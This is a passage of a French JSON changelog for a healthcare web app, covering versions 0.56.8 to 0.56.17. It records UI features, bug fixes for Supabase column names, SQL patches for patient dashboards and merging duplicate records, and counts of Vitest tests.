          "note": "État mounted pour éviter hydration mismatch SSR/CSR",
          "lang": "js",
          "before": "export default function FloatingActionBar() {\n  const router = useRouter();\n  const pathname = usePathname();\n  const [openMenu, setOpenMenu] = useState(null);\n\n  if (isHidden) return null;\n\n  return (\n    <>\n      <style jsx>{`\n        .fab-bar { ... }\n      `}</style>\n      ...\n    </>\n  );\n}",
          "after": "export default function FloatingActionBar() {\n  const router = useRouter();\n  const pathname = usePathname();\n  const [openMenu, setOpenMenu] = useState(null);\n  const [mounted, setMounted] = useState(false);\n\n  // 0.56.17 : éviter les hydration mismatch SSR/CSR\n  // — on attend le mount côté client avant de rendre la barre\n  // (sinon erreurs React #418/#423)\n  useEffect(() => {\n    setMounted(true);\n  }, []);\n\n  if (isHidden || !mounted) return null;\n\n  // Plus de <style jsx> — CSS déplacé dans globals.css\n  return (\n    <>\n      <div className=\"fab-bar\">...</div>\n    </>\n  );\n}"
        }
      },
      { "code": "BUG", "txt": "Erreur 400 sur /rest/v1/consentements_rgpd?select=...,template_libelle — la colonne template_libelle n'existe pas dans la table consentements_rgpd. Fix : retrait de template_libelle du select dans app/patient/[id]/page.js. La table doit avoir une jointure vers consentements_templates pour récupérer le libellé, à implémenter dans une future version si nécessaire",
        "code_snippet": {
          "file": "app/patient/[id]/page.js",
          "note": "Retrait colonne inexistante template_libelle",
          "lang": "js",
          "before": "supabase.from(\"consentements_rgpd\")\n  .select(\"id, date_signature, a_consenti, date_expiration, template_libelle\")\n  .eq(\"patient_id\", patId)\n  .order(\"date_signature\", { ascending: false }),",
          "after": "// 0.56.17 : template_libelle n'existe pas en base (colonne fantôme)\nsupabase.from(\"consentements_rgpd\")\n  .select(\"id, date_signature, a_consenti, date_expiration\")\n  .eq(\"patient_id\", patId)\n  .order(\"date_signature\", { ascending: false }),"
        }
      },
      { "code": "AI", "txt": "+8 tests Vitest : FloatingActionBar (3 : pas de style jsx, mounted state, commentaire 0.56.17), CSS globals (3 : keyframes, .fab-bar avec safe-area, media queries 640/768), consentements fix (2 : select sans template_libelle, colonnes utiles gardées). 3 tests 0.56.16 ajustés pour la nouvelle organisation CSS. Total 2186 tests verts (vs 2178)" }
    ],
    "themes": ["bugfix", "hydration", "ssr", "react"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.17.html",
    "sqlFile": null
  },
  {
    "v": "0.56.16",
    "kind": "version",
    "titre": "✨ Barre d'actions flottante en bas (mobile + desktop) — Scan / Mon étab / Commande",
    "chantiers": [
      { "code": "FE", "txt": "Nouveau composant FloatingActionBar (app/FloatingActionBar.js ~370 lignes) : barre d'actions flottante centrée en bas de l'écran avec 3 bulles principales — Scan/OCR (violet #5a4a90, ouvre popup 4 options), Mon étab (bleu #185FA5, raccourci direct vers /etablissement/fiche), Commande (orange #EF9F27, ouvre popup 3 options). Design glassmorphism avec backdrop-filter blur(14px), border-radius 999px (capsule), ombres douces multi-couches, animation d'entrée pop-in cubic-bezier(0.34, 1.56, 0.64, 1) — apparition spring-style à l'arrivée sur la page" },
      { "code": "FE", "txt": "Popup central avec backdrop semi-transparent + blur léger, slide-in depuis le bas avec animation spring. Header coloré avec gradient et bouton X. Liste d'actions cliquables avec hover background gris, icône colorée dans un carré arrondi (color22 background), label + sous-titre descriptif, chevron à droite. Fermeture par : clic backdrop, touche ESC, navigation, ou bouton X" },
      { "code": "FE", "txt": "Bulle Scan ouvre 4 actions : Créer un patient (bulletin OCR vert), Lire ordonnance (prescription OCR violet), Scanner code-barre (bleu), Scanner QR code (violet clair). Bulle Commande ouvre 3 actions : Voir mon panier (rouge), Mes commandes (teal), Achats (orange). Chaque action a une icône, un label court, et un sous-titre descriptif explicatif" },
      { "code": "FE", "txt": "Responsive et accessible : safe-area-inset-bottom pour iPhones avec encoche (env(safe-area-inset-bottom)), gap+padding réduits sur écrans < 640px, role='navigation' + aria-label sur la barre, role='dialog' + aria-label sur les popups, bouton fermer avec aria-label='Fermer', support clavier (ESC ferme la popup), title attribut sur les bulles pour tooltip hover. Tap effect mousedown→scale 0.92 puis retour normal. État actif (popup ouverte) avec translateY(-3px) scale(1.05) + ombre élargie de la couleur de la bulle" },
      { "code": "FE", "txt": "Masquée intelligemment sur /login, /inscription, /presentation (pas de pollution sur les pages où elle n'a pas de sens). useEffect qui ferme automatiquement la popup au changement de route (usePathname). Z-index 998 pour le backdrop, 999 pour la barre et les popups, donc toujours au-dessus du contenu sans recouvrir les modales critiques" },
      { "code": "FE", "txt": "CSS globals.css ajusté : .wrap desktop padding-bottom passe de 60px à 110px, mobile de 90px à 130px pour laisser la place à la FAB sans recouvrir le contenu en bas de page (notamment les boutons d'action en bas de formulaires longs)" },
      { "code": "FE", "txt": "Layout principal (app/layout.js) : import + mount <FloatingActionBar /> après BiometricOptInModal. Composant client (useState/useEffect/useRouter/usePathname) qui s'hydrate après les autres helpers globaux (DialogsHost, AlertToast, etc.)" },
      { "code": "AI", "txt": "+21 tests Vitest : composant FloatingActionBar (16 : exports, 3 bulles, 4 actions Scan, 3 actions Commande, routes correctes, masquage HIDDEN_PATHS, ESC ferme, backdrop blur, animations, safe-area, glassmorphism, responsive 640px, état actif, accessibilité role+aria), Layout intégration (2 : import, mount), CSS padding (3 : desktop 110px, mobile 130px). Total 2178 tests verts (vs 2157)" }
    ],
    "themes": ["feature", "ui_ux", "mobile", "accessibility", "navigation"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.16.html",
    "sqlFile": null
  },
  {
    "v": "0.56.15",
    "kind": "version",
    "titre": "🎯 Module Équipes + TopBar workflow métier 6 sections",
    "chantiers": [
      { "code": "SQL", "txt": "Module équipes COMPLET (supabase/aveho-PATCH-vers-0.56.15.sql) : 3 tables — (1) equipes(id, structure_id, batiment_id nullable, nom, description, couleur, est_par_defaut, archive, audit) avec 4 RLS policies multi-tenant + 2 index, (2) equipes_membres(equipe_id, user_id, role_dans_equipe IN responsable|membre, added_at, added_by) avec PK composite + 4 RLS, (3) equipes_services(equipe_id, service_id) avec PK composite + 4 RLS. Trigger trg_create_default_team qui crée auto 'Équipe {batiment.nom}' à chaque INSERT batiments. 3 RPC SECURITY DEFINER : equipes_avec_stats(p_batiment_id), equipe_detail(p_equipe_id), mes_equipes()" },
      { "code": "FE", "txt": "Nouvelle page /equipes ~250 lignes : liste filtrable par bâtiment + recherche texte, groupée par bâtiment avec compteur, modale de création avec input couleur picker (input type='color'), badge 'PAR DÉFAUT' avec icône étoile pour les équipes auto-créées, affichage stats (nb_membres + nb_services + 3 premiers noms services). Archivage soft (update archive=true)" },
      { "code": "FE", "txt": "Nouvelle page /equipe/[id] ~330 lignes : header gradient à la couleur de l'équipe avec icône users-group, gestion membres avec liste candidats (exclus de l'équipe), toggle responsable ↔ membre via bouton crown EF9F27, suppression avec confirmation, gestion services rattachés (avec hiérarchie bâtiment > étage affichée pour aider le choix), composants ContactActions pour les actions mail" },
      { "code": "FE", "txt": "TopBar réorganisée en 6 sections workflow métier dans l'ordre : Mon espace → Collectivité → Scan → Commande → Livraison → Administratif → Administration. Anciennes sections Établissement/Stock/Groupement fusionnées dans Collectivité (toute la hiérarchie : groupement → étabs → équipes → patients → matériel → stock → RPPS). Achats déplacé dans Commande (cohérence workflow). Maintenance/Calendrier/TV regroupés dans Livraison avec Interventions/Transferts. Section Administratif regroupe TOUT le quotidien admin (RGPD, stats, signalements, paramètres) tandis qu'Administration est réservé au tech (utilisateurs, audit, logs, performances, admin RPPS/référentiels)" },
      { "code": "FE", "txt": "Entrée /equipes ajoutée dans Collectivité avec icône ti-users-group couleur violet #5a4a90 (cohérente avec la palette Aveho)" },
      { "code": "AI", "txt": "+34 tests Vitest sur __tests__/v056-15-equipes-topbar.test.js : SQL module équipes (10), Page /equipes (7), Page /equipe/[id] (7), TopBar refonte (10). 1 test 0.55.46 ajusté pour le renommage 'Outils scan' → 'Scan'. Total 2157 tests verts (vs 2123)" }
    ],
    "themes": ["feature", "equipes", "topbar", "workflow", "ui_ux"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.15.html",
    "sqlFile": "aveho-PATCH-vers-0.56.15.sql"
  },
  {
    "v": "0.56.14",
    "kind": "version",
    "titre": "🎨 Login bio toujours visible · Dump RPPS lien direct · Google Reviews diagnostic enrichi",
    "chantiers": [
      { "code": "FE", "txt": "Page /login refonte des boutons biométriques : les 2 boutons (Détection faciale + Empreinte) sont DÉSORMAIS TOUJOURS visibles si WebAuthn est supporté, avec état grisé + tooltip explicatif si non utilisable. 3 raisons possibles de désactivation : (1) navigateur ne supporte pas, (2) email pas encore renseigné, (3) méthode pas activée pour cet email — connecte-toi d'abord avec mot de passe puis active dans ton profil. Couleur grise #d3d9e0, cursor not-allowed, message d'info en petit sous le label, attribut title= pour tooltip natif. Le bouton garde son icône (ti-face-id violet / ti-fingerprint bleu)" },
      { "code": "FE", "txt": "Nouveau composant BioButton réutilisable (dans app/login/page.js) avec props method/icon/label/busy/bioAvailable/enabled/email/onClick/color qui gère tout l'état (chevron > visible si actif, info-circle visible si grisé). Plus lisible pour le user qui voit clairement les 2 options même s'il les a pas activées" },
      { "code": "FE", "txt": "Page /admin/rpps-dump : ajout d'un panneau bleu 'Liens directs ANS' avec 2 boutons cliquables. Bouton 1 : 'Ouvrir la page d'extractions ANS' (bleu) → ouvre annuaire.sante.fr/web/site-pro/extractions-publiques dans un nouvel onglet. Bouton 2 : 'Télécharger PS_LibreAcces (CSV ZIP)' (vert) → lance directement le téléchargement du fichier ZIP via l'URL portlet ANS (telechargerCNOM). Note explicative en italique : ZIP ~150 Mo compressé, CSV ~500 Mo décompressé" },
      { "code": "BE", "txt": "Route /api/google-reviews/sync : diagnostic d'erreur enrichi. Parse le JSON du body d'erreur (au lieu de juste afficher la string brute). Ajoute un champ 'hint' avec un message d'aide contextuel : (1) si erreur mentionne API_KEY → 'Variable GOOGLE_PLACES_API_KEY non configurée côté Edge Function. Va dans Supabase → Settings → Edge Functions → Secrets et ajoute-la', (2) si 404/not_found → 'L'Edge Function n'est peut-être pas déployée. Lance : supabase functions deploy sync-google-reviews', (3) si timeout → 'Lance avec etablissement_id spécifique pour tester'. Retour structuré { ok: false, error, hint, raw } pour debug" },
      { "code": "FE", "txt": "Page /admin/avis-google : affichage du hint en sous-bloc italique avec icône ti-bulb sous le message d'erreur. Permet à l'utilisateur de comprendre immédiatement quoi faire pour corriger (au lieu de devoir interpréter un message technique brut)" },
      { "code": "AI", "txt": "+14 tests Vitest : Login BioButton (4 : composant défini, méthode face+empreinte toujours rendues, 3 raisons grisé, état disabled visuels), Dump RPPS (3 : panel liens, lien extractions, lien CSV ZIP), Google Reviews diagnostic (5 : parse JSON, hints API_KEY/deploy/timeout, retour structuré), Affichage hint (2). Total 2123 tests verts (vs 2109)" }
    ],
    "themes": ["ui_ux", "bugfix", "biometric", "rpps", "google"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.14.html",
    "sqlFile": null
  },
  {
    "v": "0.56.13",
    "kind": "version",
    "titre": "🐛 Fix renvoyer invitation (inviteLink manquant) + colonnes caisses (type_caisse + cp)",
    "chantiers": [
      { "code": "BUG", "txt": "Bouton 'Renvoyer' sur la liste des utilisateurs renvoyait 400 (inviteLink manquant). La fonction relancerInvitation appelait supabase.functions.invoke('invite-user') sans inclure le lien d'inscription dans le body, alors que l'Edge Function le valide en obligatoire. Fix : reconstruction de l'inviteLink depuis i.token (déjà chargé par le select * sur invitations) avec window.location.origin + /inscription/{token}" },
      { "code": "FE", "txt": "relancerInvitation enrichie : gestion propre du retour error/data avec lecture du context.body pour afficher le détail Resend si erreur. Ne crash plus silencieusement en alert générique" },
      { "code": "BUG", "txt": "Table caisses_assurance_maladie : 2 colonnes mal nommées en 0.56.4 — la colonne s'appelle 'type_caisse' (pas 'type') et 'cp' (pas 'code_postal'). Mêmes types d'erreur que pour mutuelles (cf 0.56.12). Le SELECT * passait mais les INSERT/UPDATE plantaient et la RPC patient_dashboard_summary échouait silencieusement sur le type" },
      { "code": "FE", "txt": "Page /admin/referentiels-sante : affichage caisses utilise item.type_caisse || item.type (fallback). Init création caisse utilise type_caisse: 'CPAM' au lieu de type. Form select caisse écrit dans entity.type_caisse. Field code postal pour caisses unifié sur cp (les 2 tables utilisent cp en réalité). fillFromBAN simplifié : un seul set avec cp pour les 2 tables" },
      { "code": "BE", "txt": "Route /api/caisses : POST insère type_caisse + cp avec mapping depuis les anciens noms (rétrocompat). PUT remappe automatiquement {type} → {type_caisse} et {code_postal} → {cp} via destructuring const { id, code_postal, type, ...rest } = body" },
      { "code": "SQL", "txt": "Patch 0.56.10 re-corrigé (livré en outputs) : RPC patient_dashboard_summary — (select type from caisses_assurance_maladie...) devient (select type_caisse from caisses_assurance_maladie...). Sans ce fix, le dashboard patient affichait NULL pour le type de la caisse" },
      { "code": "AI", "txt": "+14 tests Vitest : relancerInvitation (4 : inviteLink construit, passé dans body, gestion détail erreur, commentaire), Page caisses (5 : init type_caisse, affichage, set type_caisse, set cp, fillFromBAN unifié), API caisses (4 : POST type_caisse+cp, PUT remap, destructuring), SQL (1). Total 2109 tests verts (vs 2095)" }
    ],
    "themes": ["bugfix", "edge_function", "caisses", "colonnes"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.13.html",
    "sqlFile": null
  },
  {
    "v": "0.56.12",
    "kind": "version",
    "titre": "🐛 Fix colonnes table mutuelles · raison_sociale au lieu de nom · cp au lieu de code_postal · type_organisme au lieu de type",
    "chantiers": [
      { "code": "BUG", "txt": "Erreur 400 Bad Request sur GET /rest/v1/mutuelles?order=nom.asc : la table mutuelles n'a PAS de colonne 'nom' — elle s'appelle 'raison_sociale'. Les autres colonnes diffèrent aussi : 'cp' au lieu de 'code_postal', 'type_organisme' au lieu de 'type'. Cela causait un crash silencieux sur la page /admin/referentiels-sante onglet Mutuelles et faisait planter le dashboard patient" },
      { "code": "FE", "txt": "Page /admin/referentiels-sante : helper getNom(item) qui résout nom||raison_sociale selon ce qui est présent. Query .order('raison_sociale') au lieu de .order('nom') pour les mutuelles (gardé 'nom' pour caisses). Init du formulaire de création utilise raison_sociale + type_organisme pour onglet mutuelles. Validation save() vérifie le bon champ selon l'onglet. Filtre items et affichage liste utilisent getNom. Affichage code postal : item.code_postal || item.cp. Affichage type mutuelle : item.type_organisme || item.type" },
      { "code": "FE", "txt": "EditModal mutuelles : label 'Raison sociale *' au lieu de 'Nom *' avec set('raison_sociale', v). Type select utilise type_organisme. 2 nouveaux champs ajoutés visibles dans la modale mutuelles : 'Nom court' (diminutif usuel comme 'Harmonie') et 'Code organisme' (code_orgcomp). Champ Code postal utilise 'cp' pour mutuelles, 'code_postal' pour caisses. fillFromBAN remappe en cp pour mutuelles uniquement" },
      { "code": "BE", "txt": "Route /api/mutuelles : POST accepte body.raison_sociale OU body.nom (fallback rétrocompatible). Payload insère raison_sociale + type_organisme + cp avec mapping depuis les anciens noms. PUT remappe automatiquement : si body contient {nom} il devient {raison_sociale}, {code_postal} → {cp}, {type} → {type_organisme}. Extraction propre via destructuring const { id, nom, code_postal, type, ...rest } = body" },
      { "code": "SQL", "txt": "Patch 0.56.10 corrigé (livré en outputs) : RPC patient_dashboard_summary corrigée — la sous-requête (select nom from mutuelles where id = v_patient.mutuelle_id) devient (select raison_sociale from mutuelles...). Sans ce fix, le dashboard patient affichait 'Non renseignée' pour la mutuelle même si le patient en avait une" },
      { "code": "AI", "txt": "+17 tests Vitest : Page referentiels (12 : getNom helper, order raison_sociale, init création, validation save, filtre, affichage liste, label EditModal, type_organisme+nom_court+code_orgcomp, cp/code_postal, affichage cp, affichage type, fillFromBAN mapping), API mutuelles (4 : POST accepte raison_sociale, payload mapping, PUT remap, destructuring), SQL 0.56.10 (1 : select raison_sociale). 1 test 0.56.4 ajusté. Total 2095 tests verts (vs 2078)" }
    ],
    "themes": ["bugfix", "mutuelles", "colonnes", "mapping"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.12.html",
    "sqlFile": null
  },
  {
    "v": "0.56.11",
    "kind": "version",
    "titre": "🔧 Patch correctif · CORS Edge Function invite-user · scanner QR cleanup robuste · Service Worker sans faux 503 · safe SQL groupements",
    "chantiers": [
      { "code": "BE", "txt": "Edge Function invite-user (supabase/functions/invite-user/index.ts) : ajout complet du support CORS. Constantes CORS_HEADERS (Access-Control-Allow-Origin: *, Methods POST+OPTIONS, Headers authorization+apikey+content-type+x-client-info, Max-Age 86400). Handler OPTIONS preflight retourne 204 + CORS. JSON_HEADERS combine Content-Type + CORS_HEADERS et est appliqué sur les 6+ réponses client (RESEND_KEY manquant, inviteLink manquant, email manquant, erreur Resend, succès, exception 500). Status 405 Method not allowed retourne aussi CORS_HEADERS. Sans ce fix, l'app Vercel ne pouvait plus inviter d'utilisateurs (preflight refusé)" },
      { "code": "FE", "txt": "Composant QrScanner (app/QrScanner.js) : cleanup useEffect robuste pour html5-qrcode. Le bug 'NotFoundError: removeChild' + 'Cannot clear while scan is ongoing' + 'AbortError: play() interrupted' venait du fait que le cleanup tentait stop().then(clear()) alors que html5-qrcode était dans un état intermédiaire (STATE_STARTING par exemple). Désormais : on appelle scanner.getState?.() avant d'agir, on stoppe uniquement si STATE_SCANNING (2) ou STATE_PAUSED (3), sinon clear direct (idempotent). 3 endroits corrigés : cleanup useEffect + callback autoStop dans onResult + switchCamera" },
      { "code": "FE", "txt": "Service Worker (public/sw.js) networkFirst : ne retourne plus 503 si le serveur répond avec un statut inhabituel mais cohérent (404, 500, etc.). Avant : on attendait res.ok pour retourner res, sinon fallback offline. Désormais : on retourne res quelle que soit son ok (le navigateur saura quoi faire d'un 404 par exemple). Le fallback offline n'arrive qu'en cas de vraie panne réseau (throw). Cela évite les 'qr:1 503 Offline' qui apparaissaient quand le SW interceptait des transitions Next" },
      { "code": "SQL", "txt": "Patch 0.56.7 mis à jour en version SAFE (livré en outputs) : détection conditionnelle de la table groupements via to_regclass('public.groupements'). Si la table existe, RPC complète. Sinon, RPC créée en stub vide qui retourne 0 résultat (la page admin affichera l'onglet Groupements vide mais sans erreur). Index GIN trigramme aussi conditionnel. RPC ignorer_doublon avec execute dynamique + raise si table absente quand cible='groupement'. Permet de jouer le patch même sur les schémas où la hiérarchie groupements n'est pas implémentée" },
      { "code": "SQL", "txt": "Patches 0.56.8 et 0.56.10 corrigés (livrés en outputs) : remplacement de max(uuid) qui n'existe pas en PostgreSQL. Pour récupérer le medecin_prescripteur_id / prescripteur_prenom / prescripteur_rpps / prescripteur_specialite associé à un groupe, on utilise désormais une sous-requête (select ... from prescriptions where lower(prescripteur_nom)=key and X is not null order by date_prescription desc nulls last limit 1) qui récupère la valeur de la prescription la plus récente. Plus propre et cohérent que max() qui était choisi au hasard" },
      { "code": "AI", "txt": "+16 tests Vitest : Edge Function CORS (7 : constantes, OPTIONS 204, headers preflight, methods, JSON_HEADERS combine, 6+ usages, 405 with CORS), QrScanner cleanup (6 : getState check, states 2/3, stop.then.clear, autoStop protégé, switchCamera protégé, commentaire 0.56.11), SW networkFirst (3). 4 tests des versions précédentes ajustés (max remplacé par sous-requête, archive conditionnel). Total 2078 tests verts (vs 2062)" }
    ],
    "themes": ["bugfix", "cors", "edge_function", "scanner_qr", "service_worker"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.11.html",
    "sqlFile": null
  },
  {
    "v": "0.56.10",
    "kind": "version",
    "titre": "🩺 Dashboard santé patient · vue consolidée prescriptions + médecins + droits sécu/mutuelle + alertes contextuelles · 4 RPC agrégées",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.56.10 : 4 nouvelles RPC SECURITY DEFINER pour la vue consolidée santé du patient. Toutes vérifient l'accès via membres_structure avant de retourner quoi que ce soit. patient_dashboard_summary(p_patient_id) renvoie 17 champs agrégés (total prescriptions/actives, total médicaments + uniques avec DCI fallback, total médecins, dernière prescription date, count renouvelables, flags ALD/C2S/AME/tiers_payant, droits secu/mutuelle fin + jours_avant_fin calculés, caisse + mutuelle noms)" },
      { "code": "SQL", "txt": "RPC patient_dashboard_medicaments_actifs : liste des médicaments actuellement prescrits (statut active), dédupliqués par DCI préférée fallback nom commercial via row_number() partition. Retourne pour chaque médicament le dernier dosage + posologie + date + nb_prescriptions (count over partition) + flag est_dci_fournie + commentaire (ALD, à jeun, etc.)" },
      { "code": "SQL", "txt": "RPC patient_dashboard_medecins : liste agrégée des médecins qui ont prescrit pour ce patient, groupés par nom case-insensitive. Récupère via sous-requêtes les ville/téléphone/email depuis medecins_prescripteurs si lié via medecin_prescripteur_id (0.56.5). bool_or sur rpps_verifie pour le badge global. Tri par dernière_date desc nulls last" },
      { "code": "SQL", "txt": "RPC patient_dashboard_alertes : génère 5 types d'alertes contextuelles avec 3 niveaux de sévérité (critique/warning/info). expiration_secu et expiration_mutuelle critique si expiré, warning si <= 30 jours, avec jours_restants calculés. ald_sans_commentaire info si ALD = true mais ald_commentaire vide. no_caisse warning si caisse_id null. renouvellement info si prescriptions actives renouvelables et date > 60 jours" },
      { "code": "FE", "txt": "Nouvelle page /patient/[id]/dashboard : appel des 4 RPC en parallèle au load. Header gradient bleu marine avec avatar initiales + nom + âge calculé + n° dossier + date naissance + sexe + n° sécu, + boutons retour 'Éditer la fiche' et 'Vue matériel'. Section alertes contextuelles ambré en haut si > 0, composant AlerteRow avec 3 niveaux visuels distincts (rouge critique / ambré warning / bleu info) + badge sévérité en pill" },
      { "code": "FE", "txt": "Dashboard : 5 KPI cards (Prescriptions total mis en évidence violet + actives en sub, Médicaments uniques + nb lignes, Médecins prescripteurs distincts, Renouvelables, Dernière ordonnance date). Section 'Statut administratif' avec 3 StatutCards côte à côte : Caisse (avec badge MANQUANT rouge si null), Mutuelle (Tiers payant actif noté), Régimes spéciaux (Pills ALD rouge / C2S ambré / AME violet ou message vide italique + commentaire ALD si renseigné)" },
      { "code": "FE", "txt": "Dashboard : StatutCard affiche les droits jusqu'au + jours restants colorés selon urgence (rouge expirés / ambré <= 30 jours / vert ok). MedicamentRow avec dosage en code mono violet + forme + badges DCI vert + Renouvelable vert + ×N si plusieurs prescriptions + posologie italique + commentaire ambré ALD. MedecinRow avec badge Vérifié vert si RPPS validé + spécialité pill violet + ville + ContactActions (tel/mail/GPS) intégrés" },
      { "code": "FE", "txt": "Dashboard : bouton 'Scanner une ordonnance' violet en haut de la section médicaments qui redirige vers /scan/prescription?patient_id=... avec pré-sélection. Bouton 'Voir toutes les prescriptions' en bas qui redirige vers /patient/[id]/edit?tab=prescriptions. Empty states italiques si pas de données" },
      { "code": "FE", "txt": "Bouton 'Dashboard santé' (ti-clipboard-heart) ajouté sur la fiche patient /patient/[id]/page.js juste avant 'Édition complète'. Permet d'accéder rapidement à la vue consolidée santé depuis la vue 360° matériel existante" },
      { "code": "AI", "txt": "+40 tests Vitest : SQL summary (8 : function security definer, accès, compteurs, flags admin, jours calcul, sous-requêtes caisse/mutuelle, DCI fallback, renouvelables), SQL medicaments_actifs (6 : function exists, row_number dedupe, filtre active, group DCI/nom upper, dernier dosage/posologie/date, window count, est_dci_fournie), SQL medecins (5 : function exists, group lower, bool_or, sous-requêtes ville/tel/email, tri desc nulls last), SQL alertes (6 : 5 types, 3 sévérités, sécu expiré/warning, ald commentaire, no_caisse, renouvelable > 60j), Page dashboard (14 : exists, 4 RPC parallèles, header avatar + âge, 2 boutons retour, alertes conditionnelles, 5 KPI, StatutCard 3 sections, badge expiration coloré, AlerteRow 3 niveaux, MedicamentRow DCI+dosage+renouvelable, MedecinRow ContactActions, scan pre-fill, voir prescriptions tab, ALD commentaire), Bouton fiche patient (1). Total 2062 tests verts (vs 2022)" }
    ],
    "themes": ["patient", "dashboard", "ui_ux", "stats", "alertes"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.10.html",
    "sqlFile": "aveho-PATCH-vers-0.56.10.sql"
  },
  {
    "v": "0.56.9",
    "kind": "version",
    "titre": "🔀 Fusion automatique des doublons · découverte FK dynamique via information_schema · merge léger des champs vides · rollback avec snapshot",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.56.9 : table doublons_fusions historique des fusions (structure_id, cible etablissement/groupement/medecin, gagnant_id + label, perdant_id + label, perdant_snapshot jsonb pour rollback complet, fk_migrees jsonb détaillant chaque table+colonne+nb_rows, nb_rows_migrees total, fusionne_par auth.uid, raison, created_at, et 4 champs rollback : rollback_at, rollback_par, rollback_raison, est_rollbacke). 3 index (struct+date, perdant_id, gagnant_id). 3 RLS isolant par structure" },
      { "code": "SQL", "txt": "RPC preview_fusion_doublon(cible, gagnant_id, perdant_id) : découverte DYNAMIQUE de toutes les FK pointant vers la table cible via information_schema.referential_constraints + table_constraints + key_column_usage. Pour chaque FK, compte le nb de rows pointant vers le perdant et retourne table_name + column_name + nb_rows + delete_rule. Filtre les FK à 0 rows. Permet à l'UI d'afficher un preview avant fusion (transparence + confiance)" },
      { "code": "SQL", "txt": "RPC fusionner_doublon(cible, gagnant_id, perdant_id, raison, merge_champs=true) : (1) valide gagnant≠perdant + même structure + accès user, (2) snapshot du perdant via to_jsonb pour rollback, (3) découvre FK dynamiquement (même logique que preview), (4) pour chaque FK : UPDATE source SET col=gagnant WHERE col=perdant, gère unique_violation en DELETE (cas tables pivot), (5) si merge_champs=true : coalesce des champs vides du gagnant avec ceux du perdant pour etablissements (siret, finess, adresse, cp, ville, tel, email, capacite) + medecins (rpps, prenom, civilite, profession, specialite, raison_sociale, finess, adresse, cp, ville, tel, email, coords, est_verifie OR, source_verification), (6) DELETE perdant, (7) INSERT trace dans doublons_fusions avec snapshot + fk_migrees détaillé + nb_rows_migrees total, (8) DELETE doublons_ignores pointant vers perdant (devenu obsolète)" },
      { "code": "SQL", "txt": "RPC rollback_fusion(fusion_id, raison) : (1) vérifie fusion existe + utilisateur autorisé + pas déjà rollbackée, (2) recrée le perdant via jsonb_populate_record + INSERT (clé primaire + toutes colonnes restaurées exactement comme avant), (3) marque la fusion comme rollbackée avec rollback_at + rollback_par + rollback_raison. NB : les FK déjà migrées vers le gagnant restent là — le rollback recrée le perdant à vide mais les prescriptions/contrats migrés restent sur le gagnant. C'est documenté comme 'best effort'" },
      { "code": "FE", "txt": "Page /admin/doublons-forces enrichie : bouton 'Fusionner' rouge sur chacune des 3 cards (DoublonCardEtab, DoublonCardGroupement, DoublonCardMedecin) à côté du bouton 'Marquer non-doublon'. State fusionModal qui pilote l'ouverture de la modale" },
      { "code": "FE", "txt": "Nouveau composant FusionModal (modale 700px scrollable) : (1) choix du gagnant via 2 cartes ChoixCard cliquables avec badge 'GARDÉ' sur la sélectionnée + auto-suggestion intelligente du gagnant (celui avec le plus de FK pour groupements et médecins), (2) preview live des migrations à venir via RPC preview_fusion_doublon (tableau table/colonne/nb_rows/action FK avec total en gras), (3) champ raison libre (encouragé pour l'audit), (4) panneau warning ambré sur l'irréversibilité immédiate + snapshot conservé, (5) bouton 'Confirmer la fusion' rouge gros qui appelle fusionner_doublon avec merge_champs=true" },
      { "code": "FE", "txt": "Nouveau composant ChoixCard : carte cliquable avec bordure 2px qui devient colorée quand sélectionnée, badge 'GARDÉ' coin haut-droit, nom + sous-titre + nb références si dispo. Composant HistoriqueRow : affiche chaque fusion avec badge cible coloré + gagnant ← perdant (strikethrough sur perdant) + nb_rows_migrees + date + raison italique + bouton 'Annuler cette fusion' rouge léger qui appelle rollback_fusion. Si déjà rollbackée : opacité réduite + badge ambré 'ROLLBACKÉE'" },
      { "code": "FE", "txt": "Page admin : section 'Historique des fusions' en bas avec toggle replier/voir (default replié si vide). Charge les 20 dernières fusions au démarrage et après chaque fusion/rollback. Après fusion réussie : reload de la détection + stats + historique en parallèle pour UI cohérente" },
      { "code": "AI", "txt": "+37 tests Vitest : SQL table fusions (5 : structure+contraintes, snapshot jsonb, audit fields, fk_migrees jsonb, 3 RLS), RPC preview (5 : params, information_schema discovery, 3 cibles mapping, retour 4 champs, filtre count>0), RPC fusion (10 : params merge_champs, gagnant≠perdant, même struct, accès user, snapshot, FK discovery+update, unique_violation→delete, merge coalesce, DELETE perdant, INSERT trace, cleanup ignores), RPC rollback (3 : exists+est_rollbacke, jsonb_populate_record, marqueurs rollback), UI integration (13 : state fusionModal+historique, openFusion 3 cibles, loadHistorique limit 20, bouton Fusionner sur 3 cards, FusionModal preview, auto-suggestion gagnant, ChoixCard GARDÉ, executeMerge RPC, warning irreversible, HistoriqueRow rollback, ROLLBACKÉE display, tableau preview, btnMerge rouge). Total 2022 tests verts (vs 1985) — passe le cap symbolique des 2000 tests !" }
    ],
    "themes": ["admin", "audit", "doublons", "fusion", "rollback", "information_schema"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.9.html",
    "sqlFile": "aveho-PATCH-vers-0.56.9.sql"
  },
  {
    "v": "0.56.8",
    "kind": "version",
    "titre": "📚 Prescriptions archive · recherche multi-critères + dashboard stats + top médicaments/prescripteurs + tendances mensuelles + export CSV (avec ou sans lignes méds)",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.56.8 : 6 nouveaux index pour accélérer les recherches multi-critères — idx_prescriptions_struct_date (where statut active), idx_prescriptions_type, idx_prescriptions_source, 3 index GIN trigramme (prescripteur_nom + medicament_nom + medicament_dci) pour recherche fuzzy ilike performante" },
